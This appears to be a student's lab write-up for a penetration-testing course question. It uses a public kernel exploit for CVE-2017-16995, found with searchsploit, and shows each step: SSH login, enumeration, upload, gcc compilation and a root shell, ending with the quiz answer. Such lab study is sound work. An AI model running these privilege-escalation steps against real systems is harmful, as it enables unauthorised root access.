@@ -1,0 +1,50 @@
+Questions 1
+Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. What is the name of the compiler used to generate the exploit's executable file?
+
+ssh joe@192.168.155.216
+password: offsec
+
+joe@ubuntu-privesc:~$ cat /etc/issue
+Ubuntu 16.04.4 LTS \n \l
+joe@ubuntu-privesc:~$ uname -r
+4.4.0-116-generic
+joe@ubuntu-privesc:~$ arch
+x86_64
+
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
+...
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation     | linux/local/45010.c
+...
+
+# Lets try the last exploit 
+cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+
+head 45010.c -n 20
+...
+ gcc cve-2017-16995.c -o cve-2017-16995
+...
+
+# Luckily compile the source code into an executable, just need to invoke gcc and specify the C source code and the output filename. 
+
+# Upload the payload
+mv 45010.c cve-2017-16995.c 
+scp cve-2017-16995.c joe@192.168.155.216:
+
+joe@ubuntu-privesc:~$ ls
+cve-2017-16995.c
+
+# Lets compile and start exploit on the victim machine
+joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995
+file cve-2017-16995
+cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=588d687459a0e60bc6cb984b5180ec8c3558dc33, not stripped
+
+joe@ubuntu-privesc:~$ ./cve-2017-16995 
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(joe)
+
+# Now we have the shell
+# Lets back to the Questions 'What is the name of the compiler used to generate the exploit's executable file?'
+gcc
+
+
+
